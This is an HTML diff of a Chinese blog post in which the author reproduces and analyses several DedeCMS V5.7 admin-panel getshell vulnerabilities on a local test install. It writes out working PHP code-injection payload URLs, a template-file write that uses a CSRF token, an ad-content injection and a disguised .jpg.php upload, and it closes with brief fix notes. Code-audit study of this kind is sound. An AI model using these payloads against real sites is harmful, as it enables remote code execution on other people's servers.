@@ -7,17 +7,46 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>Tag: php反序列化 | 低效率的勤奋是鸦片 | glotozz&#39;blog</title>
+  <title>Dedecms漏洞分析 | 低效率的勤奋是鸦片 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta property="og:type" content="website">
-<meta property="og:title" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
-<meta property="og:url" content="https://glotozz.github.io/tags/php反序列化/index.html">
+  <meta name="description" content="打算先从复现一些简单那的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
+<meta name="keywords" content="cms,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dedecms漏洞分析">
+<meta property="og:url" content="https://glotozz.github.io/2019/09/23/Dedecms漏洞分析/index.html">
 <meta property="og:site_name" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
+<meta property="og:description" content="打算先从复现一些简单那的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/K1FIiouscT7eJbL.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/Ze1dSwLlfH7VkxM.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/6cp1AUfQDXngqOS.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/p3c61bPCWfKUgT2.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/yqabE71CSDFRYJK.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/Zap2jgXkyNUT91Q.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/a2eHN1TulY37dkK.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/dvWfoBnTp6kb3FS.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/cBGJpUlbRF5wr2z.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/DoeH6Q5EKyqYRvs.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/bND9PgIyiqmTfao.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/pknPKQYRudHDWs1.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/WzA3txf7KHiTFOs.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/YaMBIDsGHxQ7EgC.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/gtOzAqa4Ym9Vpx8.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/Eef5IujJQt6iTCU.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/TsmZKXyu7R3bSDe.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/MAfEhryDsFKiJLl.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/hjftV95a1BSoWeH.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/Sg82NlvZ59nEXdV.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/jSOrpyVeLGhH6Uz.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/qyHoJ2sakNc1PLl.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/w4zLNuXASQiotrO.png">
+<meta property="og:updated_time" content="2019-09-23T11:30:56.897Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
+<meta name="twitter:title" content="Dedecms漏洞分析">
+<meta name="twitter:description" content="打算先从复现一些简单那的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/23/K1FIiouscT7eJbL.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -145,63 +174,321 @@
           </div>
           <div id="js-content" class="content-ll">
             
-  
-  
+<article id="post-Dedecms漏洞分析" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/17/几道php反序列化的题/" class="archive-article-date">
-  	<time datetime="2019-08-16T23:09:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-17</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/17/几道php反序列化的题/">几道php反序列化的题</a>
+    <h1 class="article-title" itemprop="name">
+      Dedecms漏洞分析
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/09/23/Dedecms漏洞分析/" class="archive-article-date">
+  	<time datetime="2019-09-22T23:21:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-23</time>
+</a>
+        
+      </header>
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>打算先从复现一些简单那的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞</p>
+</blockquote>
+<a id="more"></a>
+
+<meta name="referrer" content="no-referrer">
+
+<h4 id="一、获取漏洞"><a href="#一、获取漏洞" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p>dedecms V5.7 后台getshell</p>
+<h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><p>Payload1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\%22;phpinfo();//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/23/K1FIiouscT7eJbL.png" alt="Snipaste_2019-09-23_09-39-24.png"></p>
+<p>Payload2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/stepselect_main.php?action=addenum_save&amp;ename=233&amp;issign=1&amp;egroup=;phpinfo();$</span><br><span class="line">http://127.0.0.1/dede/data/enums/;phpinfo();$.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/23/Ze1dSwLlfH7VkxM.png" alt="Snipaste_2019-09-23_10-04-46.png"></p>
+<p>Payload3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/tpl.php?action=savetagfile&amp;token=57b2990048a7dbd3c782cddc0a049a0d&amp;filename=glotozz.lib.php&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line">http://127.0.0.1/dede/include/taglib/glotozz.lib.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/23/6cp1AUfQDXngqOS.png" alt="Snipaste_2019-09-23_14-07-21.png"></p>
+<p>Payload4</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">插入ad内容	--&gt;&lt;?php phpinfo();?&gt;</span><br><span class="line">http://127.0.0.1/dede/plus/ad_js.php?nocache=1&amp;aid=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/23/p3c61bPCWfKUgT2.png" alt="Snipaste_2019-09-23_14-51-18.png"></p>
+<p>Paylaod5</p>
+<p>文件上传，准备一个内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>的info.jpg.php，压缩为info.jpg.zip，上传到soft目录下</p>
+<p>访问dede/album_add.php</p>
+<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
+<p>先根据payload1自己在当前文件寻找分析一波</p>
+</blockquote>
+<p>搜索fwrite，发现第一处</p>
+<p><img src="https://i.loli.net/2019/09/23/yqabE71CSDFRYJK.png" alt="Snipaste_2019-09-23_08-22-35.png"></p>
+<p>继续寻找变量$tmpdir</p>
+<p><img src="https://i.loli.net/2019/09/23/Zap2jgXkyNUT91Q.png" alt="Snipaste_2019-09-23_08-24-15.png"></p>
+<p>打扰了。。。查看第二处</p>
+<p><img src="https://i.loli.net/2019/09/23/a2eHN1TulY37dkK.png" alt="Snipaste_2019-09-23_08-25-58.png"></p>
+<p>搜索下$refiles，是我们直接传入的变量。。。</p>
+<p>先截取[3:]，中间的可以不管，因为不影响$filename，$i++，写入格式大概如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$files[0]=&quot;xxx&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造如下即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$files[0]=&quot;&quot;;phpinfo();//&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对那个截取[3:]有点疑惑，构造    “;phpinfo();//    调试打印下$filename，发现原来是存在addslashes()</p>
+<p><img src="https://i.loli.net/2019/09/23/dvWfoBnTp6kb3FS.png" alt="Snipaste_2019-09-23_09-35-52.png"></p>
+<p>既然是截取[3:]，构造如下即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\&quot;</span><br><span class="line">=&gt;</span><br><span class="line">\\\&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查看modifytmp.inc</p>
+<p><img src="https://i.loli.net/2019/09/23/cBGJpUlbRF5wr2z.png" alt="Snipaste_2019-09-23_10-03-26.png"></p>
+<p>成功写入后考虑包含的地方，发现就在下面。。。所以上面我们的payload只需要一个action=getfiles即可</p>
+<p><img src="https://i.loli.net/2019/09/23/DoeH6Q5EKyqYRvs.png" alt="Snipaste_2019-09-23_09-08-56.png"></p>
+<p>但是这里我们不重新访问action=down也可以，因为getfiles中下面的语句就是去加载模板文件，而模版文件中iframe加载了我们需要的down，当然我们自己去访问也行，还可以控制参数😁</p>
+<p><img src="https://i.loli.net/2019/09/23/bND9PgIyiqmTfao.png" alt="Snipaste_2019-09-23_09-11-44.png"></p>
+<p><img src="https://i.loli.net/2019/09/23/pknPKQYRudHDWs1.png" alt="Snipaste_2019-09-23_09-16-20.png"></p>
+<blockquote>
+<p>Payload1的漏洞成因主要是fwrite，以及先addslashes()后进行了substr截取</p>
+</blockquote>
+<blockquote>
+<p>分析下Paylaod2</p>
+</blockquote>
+<p>这里是利用enums.func.php中的fwrite</p>
+<p><img src="https://i.loli.net/2019/09/23/WzA3txf7KHiTFOs.png" alt="Snipaste_2019-09-23_10-14-44.png"></p>
+<p>写入格式大概如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">global $em_&quot;&quot;s;</span><br><span class="line">$em_&quot;&quot;s = array();</span><br></pre></td></tr></table></figure>
+
+<p>尝试构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">global $em_;phpinfo();$s;</span><br><span class="line">$em_&quot;&quot;s = array();</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line">;phpinfo();$</span><br></pre></td></tr></table></figure>
+
+<p>搜索调用该函数的地方，并且我们控制传入的变量,且没有严格过滤</p>
+<p>stepselect_main.php中的action=addnum_save</p>
+<p><img src="https://i.loli.net/2019/09/23/YaMBIDsGHxQ7EgC.png" alt="Snipaste_2019-09-23_10-51-45.png"></p>
+<p>传入$ename和$egroup和$issign=1即可，</p>
+<p>查看data/enums/;phpinfo();$.php</p>
+<p><img src="https://i.loli.net/2019/09/23/gtOzAqa4Ym9Vpx8.png" alt="Snipaste_2019-09-23_11-10-18.png"></p>
+<p>访问即可</p>
+<blockquote>
+<p>Payload3</p>
+</blockquote>
+<p>在tpl.php中寻找fwrite()<img src="https://i.loli.net/2019/09/23/Eef5IujJQt6iTCU.png" alt="Snipaste_2019-09-23_13-36-09.png"></p>
+<p>文件名要求由[a-z0-9_-]组成，后缀为.lib.php</p>
+<p>stripslashes()函数删除由 <a href="https://www.w3school.com.cn/php/func_string_addslashes.asp" target="_blank" rel="noopener">addslashes()</a> 函数添加的反斜杠，文件内容不影响😁</p>
+<p>还要注意的就是开头有个csrf_check()</p>
+<p><img src="https://i.loli.net/2019/09/23/TsmZKXyu7R3bSDe.png" alt="Snipaste_2019-09-23_13-48-03.png"></p>
+<p>继续搜索$_SESSION[‘token’]</p>
+<p><img src="https://i.loli.net/2019/09/23/MAfEhryDsFKiJLl.png" alt="Snipaste_2019-09-23_13-54-10.png"></p>
+<p>调用这里的action=upload得到token即可，可以从前端那个隐藏的input获取，其实就是make_hash()，打个断点即可</p>
+<p><img src="https://i.loli.net/2019/09/23/hjftV95a1BSoWeH.png" alt="Snipaste_2019-09-23_14-11-32.png"></p>
+<p><img src="https://i.loli.net/2019/09/23/Sg82NlvZ59nEXdV.png" alt="Snipaste_2019-09-23_13-57-47.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/tpl.php?action=savetagfile&amp;token=57b2990048a7dbd3c782cddc0a049a0d&amp;filename=glotozz.lib.php&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再去找到文件路径DEDEINC，随便找个地方打个断点即可</p>
+<p><img src="https://i.loli.net/2019/09/23/jSOrpyVeLGhH6Uz.png" alt="Snipaste_2019-09-23_14-05-31.png"></p>
+<p>访问即可</p>
+<blockquote>
+<p>Paylaod4</p>
+</blockquote>
+<p>ad_js.php存在fwrite()+include</p>
+<p><img src="https://i.loli.net/2019/09/23/qyHoJ2sakNc1PLl.png" alt="Snipaste_2019-09-23_14-38-47.png"></p>
+<p>从数据库#@__myad读取，搜索插入数据库的地方</p>
+<p>ad_add.php</p>
+<p><img src="https://i.loli.net/2019/09/23/w4zLNuXASQiotrO.png" alt="Snipaste_2019-09-23_14-42-01.png"></p>
+<p>直接在前端页面插入，注意闭合前面的–&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/ad_add.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再次访问即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/plus/ad_js.php?arcID=1&amp;nocache=1</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><p>大多数都是fwrite()时没有对用户输入的内容进行严格过滤，都可以简单闭合或拼接插入恶意代码。</p>
+<p>第四处是sql插入数据库的数据没有进行处理，比如可以实体编码，但是这样可能功能实现方面会不同😒。</p>
+<blockquote>
+<p>复现完了四个dedecms，发现网上还有好多dedecms的漏洞，明天可以再写一篇。。。😅</p>
+<p>因为刚刚开始代码审计，现在主要还是跟着复现，可以先根据paylaod自己进行分析，并且某个存在漏洞php文件中可能存在不止一个触发漏洞的函数，也可以多尝试其他函数</p>
+</blockquote>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://mochazz.github.io/" target="_blank" rel="noopener">https://mochazz.github.io</a></p>
+<p><a href="https://zhzhdoai.github.io/" target="_blank" rel="noopener">https://zhzhdoai.github.io</a></p>
+<p><a href="https://xz.aliyun.com/t/2237" target="_blank" rel="noopener">https://xz.aliyun.com/t/2237</a></p>
+
+      
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="https://ws1.sinaimg.cn/large/006Xmmmgly1g5wqd9c77wj309a0980u1.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>glotozz</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2019/09/23/Dedecms漏洞分析/" target="_blank" title="Dedecms漏洞分析">https://glotozz.github.io/2019/09/23/Dedecms漏洞分析/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+      
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">php反序列化</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cms</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/09/23/Dedecms漏洞分析/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2019/09/22/省赛线下赛总结/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">省赛线下赛总结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -228,9 +515,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
